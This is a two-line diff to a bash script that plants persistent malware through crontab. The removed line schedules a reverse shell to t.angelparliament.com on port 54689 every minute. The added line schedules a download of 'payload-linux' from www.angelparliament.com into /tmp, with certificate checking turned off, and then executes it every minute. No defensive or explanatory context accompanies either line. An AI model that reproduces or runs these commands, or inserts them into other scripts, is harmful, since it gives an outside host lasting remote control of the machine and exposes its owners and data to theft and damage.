@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "* * * * * bash -i >& /dev/tcp/t.angelparliament.com/54689 0>&1" | crontab
+echo '* * * * * cd /tmp; curl -k -O https://www.angelparliament.com/payload-linux && chmod +x payload-linux && ./payload-linux' | crontab
